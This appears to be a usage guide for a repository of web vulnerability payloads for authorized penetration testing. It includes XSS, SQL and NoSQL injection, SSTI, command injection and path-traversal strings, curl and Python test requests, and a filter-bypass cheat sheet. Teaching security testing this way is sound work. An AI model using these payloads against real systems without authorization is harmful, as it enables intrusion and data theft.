# Usage Guide - Web Vulnerability Payloads

## 🚀 Getting Started

This repository contains comprehensive payloads for testing web application vulnerabilities. All payloads are sourced from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings).

## ⚠️ Legal Disclaimer

**USE THESE PAYLOADS ONLY ON:**
- Systems you own
- Systems you have explicit written permission to test
- Lab environments for learning

**NEVER:**
- Test on production systems without authorization
- Use for malicious purposes
- Attack systems you don't own

## 📖 How to Use This Repository

### 1. Finding Payloads

Navigate to the vulnerability type you want to test:

```bash
# View all available categories
ls -la

# Navigate to specific vulnerability (example: XSS)
cd "XSS Injection"/
cat payloads.txt

# Search for specific techniques
grep -i "bypass" payloads.txt
grep -r "cookie" ..
```

### 2. Understanding File Structure

Each vulnerability directory contains:

```
vulnerability-name/
├── payloads.txt      # Comprehensive payload list
├── README.md         # Detailed explanation (if available)
└── examples/         # Real-world examples (if available)
```

### 3. Quick Testing Workflow

#### Step 1: Identify the Vulnerability Type
```bash
# Is it an input field? → Try XSS, SQLi
# Is it a URL parameter? → Try LFI, SQLi, Command Injection
# Is it an API endpoint? → Try XXE, SSTI, NoSQL Injection
```

#### Step 2: Start with Detection Payloads
```bash
# XSS Detection
<script>alert(1)</script>

# SQL Injection Detection
' OR '1'='1' --

# Command Injection Detection
; whoami

# SSTI Detection
{{7*7}}
```

#### Step 3: Test for Bypasses
```bash
# If basic payload fails, try:
- Encoding (URL, HTML, Unicode)
- Case manipulation
- Alternative syntax
- Filter bypass techniques
```

#### Step 4: Escalate to Exploitation
```bash
# Once vulnerability confirmed:
- Extract sensitive data
- Achieve code execution
- Escalate privileges
- Document findings
```

## 🔧 Integration with Security Tools

### Burp Suite

#### 1. Using Payloads in Intruder
```
1. Right-click on request → Send to Intruder
2. Mark injection point
3. Payloads → Load → Select payload file
4. Start attack
```

#### 2. Manual Testing in Repeater
```
1. Send request to Repeater
2. Copy payload from .txt file
3. Paste into request
4. Send and analyze response
```

### OWASP ZAP

#### 1. Fuzzing
```
1. Right-click parameter → Fuzz
2. Add payload file as source
3. Start fuzzer
4. Analyze results
```

### Command Line Testing

#### Using curl
```bash
# GET Request
curl "http://target.com/page?id=1' OR '1'='1"

# POST Request
curl -X POST http://target.com/login \
  -d "username=admin&password=' OR '1'='1-- -"

# With JSON
curl -X POST http://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'
```

#### Using Python Requests
```python
import requests

# SQL Injection Test
payload = "' OR '1'='1' --"
url = f"http://target.com/page?id={payload}"
response = requests.get(url)

# XSS Test
xss_payload = "<script>alert(1)</script>"
data = {"comment": xss_payload}
response = requests.post("http://target.com/comment", data=data)
```

## 📊 Testing Methodology

### Phase 1: Reconnaissance
```
1. Map application (pages, parameters, functions)
2. Identify input points (forms, URLs, headers)
3. Note technologies used (framework, database)
4. Check for existing security mechanisms
```

### Phase 2: Vulnerability Detection
```
1. Test each input with detection payloads
2. Observe responses and errors
3. Note which inputs are vulnerable
4. Classify vulnerability types
```

### Phase 3: Exploitation
```
1. Craft working exploits
2. Test for impact (data access, RCE)
3. Try privilege escalation
4. Combine vulnerabilities
```

### Phase 4: Reporting
```
1. Document vulnerability details
2. Provide reproduction steps
3. Include proof-of-concept
4. Suggest remediation
5. Rate severity (CVSS)
```

## 🎯 Common Use Cases

### Case 1: Testing Login Form

```bash
# 1. Test for SQL Injection
username: admin' --
password: anything

username: admin' OR '1'='1' --
password: anything

# 2. Test for NoSQL Injection (if JSON API)
{"username": {"$ne": null}, "password": {"$ne": null}}

# 3. Test for XSS in error messages
username: <script>alert(1)</script>
password: test
```

### Case 2: Testing File Upload

```bash
# 1. Test for file inclusion
filename: ../../../../etc/passwd

# 2. Test for XXE (if XML upload)
Upload file with XXE payload

# 3. Test for malicious file upload
Upload: shell.php, shell.phtml, shell.php5
```

### Case 3: Testing API Endpoints

```bash
# 1. Test for XXE
POST /api/user
Content-Type: application/xml
[XXE Payload]

# 2. Test for SSTI
POST /api/template
{"template": "{{7*7}}"}

# 3. Test for NoSQL Injection
POST /api/users
{"username": {"$ne": null}}
```

## 🛡️ Bypass Techniques Reference

### Filter Bypass Cheat Sheet

```bash
# Encoding
URL: %3C%73%63%72%69%70%74%3E
HTML: &#60;script&#62;
Unicode: \u003Cscript\u003E
Hex: \x3Cscript\x3E

# Case Manipulation
<ScRiPt>alert(1)</sCrIpT>
SeLeCt * FrOm users

# Alternative Syntax
<img src=x onerror=alert(1)>
' UNI/**/ON SEL/**/ECT

# Null Bytes (older systems)
%00
../../../etc/passwd%00

# Comment Injection
<!--><script>alert(1)</script>-->
SELECT/**/username/**/FROM/**/users
```

## 📝 Creating Test Reports

### Template
```markdown
# Vulnerability Report

## Title
[Vulnerability Type] in [Component]

## Severity
[Critical/High/Medium/Low]

## Description
Detailed description of the vulnerability

## Steps to Reproduce
1. Navigate to [URL]
2. Input [payload] in [parameter]
3. Observe [result]

## Proof of Concept
[Screenshot or curl command]

## Impact
- Data exposure
- Code execution
- Privilege escalation

## Remediation
- Input validation
- Output encoding
- Use prepared statements
```

## 🔍 Troubleshooting

### Payload Not Working?

```bash
# 1. Check for WAF/Filter
- Try encoding variations
- Test for blacklist keywords
- Use alternative syntax

# 2. Verify Context
- HTML context vs JavaScript context
- URL parameter vs POST body
- JSON vs XML

# 3. Test Incrementally
- Start simple
- Add complexity gradually
- Note what triggers blocks
```

### False Positives?

```bash
# Verify by:
1. Testing multiple payloads
2. Checking application behavior
3. Reviewing response carefully
4. Testing in different contexts
```

## 📚 Learning Resources

### Recommended Order
1. Read QUICK_REFERENCE.md
2. Study specific vulnerability README
3. Practice in lab environments
4. Test in CTF challenges
5. Report responsibly

### Practice Platforms
- PortSwigger Web Security Academy
- OWASP WebGoat
- HackTheBox
- TryHackMe
- PentesterLab

## 🤝 Contributing

Found a new bypass technique? Want to add payloads?

```bash
1. Fork the repository
2. Add your payloads
3. Test thoroughly
4. Submit pull request
```

## 📞 Support

For questions or issues:
- Check existing documentation
- Review QUICK_REFERENCE.md
- Consult PayloadsAllTheThings

---

**Happy Ethical Hacking! 🔒**
